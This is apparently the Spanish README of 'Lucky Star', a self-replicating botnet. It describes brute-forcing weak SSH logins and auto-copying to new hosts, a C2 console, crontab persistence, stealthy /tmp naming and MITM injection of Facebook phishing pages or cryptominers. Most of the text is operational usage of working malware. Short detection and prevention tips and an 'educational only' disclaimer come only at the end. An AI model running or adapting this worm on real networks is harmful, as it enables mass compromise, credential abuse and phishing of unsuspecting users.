# 🦠 Auto-Replicación Automática - Lucky Star

## 🎯 ¿Cómo Funciona?

### Flujo Automático:
```
1. Bot se conecta al C2
2. C2 ordena: recon 1
3. Bot escanea red local
4. Bot encuentra SSH (puerto 22)
5. ¡AUTO-EXPLOTA sin esperar órdenes!
6. Bot se copia a sí mismo
7. Nuevo bot se ejecuta
8. Nuevo bot se conecta al C2
9. ¡REPETIR DESDE PASO 2!
```

## 🚀 Inicio Rápido

### Windows:
```batch
quick_start.bat
# Selecciona opción 4 (Demo Completo)
```

### Linux/Mac:
```bash
# Terminal 1 - C2
python3 c2_commander.py

# Terminal 2 - Bot
python3 bot_soldier.py
```

## ⚡ Comandos del C2

### Ver Estado:
```
★彡 Comandante> status
  - DESKTOP-ABC-192.168.1.100: Última vez visto
  - VICTIM-192.168.1.50: Última vez visto
  - VICTIM-192.168.1.75: Última vez visto
```

### Iniciar Escaneo (Auto-Replica):
```
★彡 Comandante> recon 1
[*] Orden de reconocimiento enviada
[*] Informe recibido: 5 hosts encontrados
[+++] AUTO-REPLICACIÓN EXITOSA EN 192.168.1.50!
[+++] AUTO-REPLICACIÓN EXITOSA EN 192.168.1.75!
[+] Nuevo bot conectado: victim-192.168.1.50
[+] Nuevo bot conectado: victim-192.168.1.75
```

### Ver Hosts Comprometidos:
```
★彡 Comandante> list 1

[1] 192.168.1.1:80 - Router Compromised [Critical]
    Vulnerabilidades:
      1. Router Weak Credentials
         Credentials: admin:admin

[2] 192.168.1.50:22 - OpenSSH 7.4 [High]
    Vulnerabilidades:
      1. SSH Weak Credentials
         ✓ AUTO-EXPLOTADO Y REPLICADO

[3] 192.168.1.75:22 - OpenSSH 8.2 [High]
    Vulnerabilidades:
      1. SSH Weak Credentials
         ✓ AUTO-EXPLOTADO Y REPLICADO
```

### Control de Auto-Replicación:
```
# Desactivar auto-replicación
★彡 Comandante> auto_rep 1 off
[*] Auto-replicación DESACTIVADA en bot #1

# Reactivar auto-replicación
★彡 Comandante> auto_rep 1 on
[*] Auto-replicación ACTIVADA en bot #1
```

### Ataque MITM:
```
★彡 Comandante> mitm 1
Opciones de HTML a inyectar:
  1. Phishing de Facebook
  2. Alerta de virus
  3. Redirección a sitio
  4. Cryptominer JS
  5. Custom HTML
Opción: 1

[*] Iniciando MITM en 5 objetivos...
[+] Ataque MITM activo!
```

## 🔥 Características de Auto-Replicación

✅ **Automática**: No requiere comandos manuales
✅ **Inteligente**: Solo ataca SSH vulnerable
✅ **Persistente**: Se auto-instala con crontab
✅ **Furtiva**: Nombre aleatorio en /tmp
✅ **Recursiva**: Cada bot replica a otros
✅ **Controlada**: Puede activarse/desactivarse desde C2

## 📊 Crecimiento Exponencial

```
Tiempo | Bots | Crecimiento
-------|------|------------
0 min  |  1   | Bot inicial
2 min  |  3   | +2 hosts SSH
5 min  |  7   | +4 hosts SSH
10 min | 15   | +8 hosts SSH
20 min | 31   | +16 hosts SSH
30 min | 63   | +32 hosts SSH (red completa)
```

## 🛡️ Persistencia Implementada

### Crontab (Linux):
```bash
@reboot /usr/bin/python3 /tmp/bot_XXXX.py &
```

### Ver bots replicados en víctima:
```bash
# En el host comprometido:
ps aux | grep python | grep bot_
crontab -l | grep bot_
```

## 🧪 Laboratorio de Prueba

### Crear 3 VMs con VirtualBox:

**VM1: Kali (C2)**
```bash
# IP: 192.168.56.10
python3 c2_commander.py
```

**VM2: Ubuntu (Víctima 1)**
```bash
# IP: 192.168.56.20
# Credenciales: admin/admin
sudo apt install openssh-server python3
```

**VM3: Debian (Víctima 2)**
```bash
# IP: 192.168.56.30
# Credenciales: root/root
sudo apt install openssh-server python3
```

### Ejecutar Bot Inicial:
```bash
# Editar bot_soldier.py:
C2_IP = '192.168.56.10'

# Ejecutar:
python3 bot_soldier.py
```

### Observar Replicación:
```
En C2 verás:
[+] Nuevo bot conectado: kali-192.168.56.10
[*] Informe: 2 hosts encontrados
[+++] AUTO-REPLICACIÓN EXITOSA EN 192.168.56.20!
[+] Nuevo bot conectado: ubuntu-192.168.56.20
[+++] AUTO-REPLICACIÓN EXITOSA EN 192.168.56.30!
[+] Nuevo bot conectado: debian-192.168.56.30
```

## ⚠️ Detección y Prevención

### Cómo Detectar:
```bash
# Buscar procesos sospechosos
ps aux | grep python | grep tmp

# Buscar archivos en /tmp
ls -la /tmp/bot_*

# Ver conexiones de red
netstat -an | grep 8443

# Revisar crontab
crontab -l
```

### Cómo Prevenir:
1. **Contraseñas fuertes** en SSH
2. **Autenticación por clave** pública
3. **Fail2ban** para bloquear brute force
4. **Firewall** restrictivo
5. **Monitoreo** de procesos y red
6. **Deshabilitar** ejecución en /tmp:
   ```bash
   mount /tmp -o noexec,nosuid
   ```

## 📝 Logs y Debugging

### Ver logs del bot:
```bash
# En el host comprometido:
tail -f /tmp/bot_*.log
```

### Ver actividad en C2:
```
★彡 Comandante> status
# Muestra última actividad de cada bot
```

## 🎓 Uso Educativo

Este sistema es **SOLO** para:
- ✅ Aprender sobre botnets
- ✅ Entender auto-replicación
- ✅ Practicar defensa
- ✅ Redes controladas propias

**NUNCA** para:
- ❌ Redes sin autorización
- ❌ Causar daño
- ❌ Actividades ilegales

---

💫 **Lucky Star Edition** - Powered by AI for Education
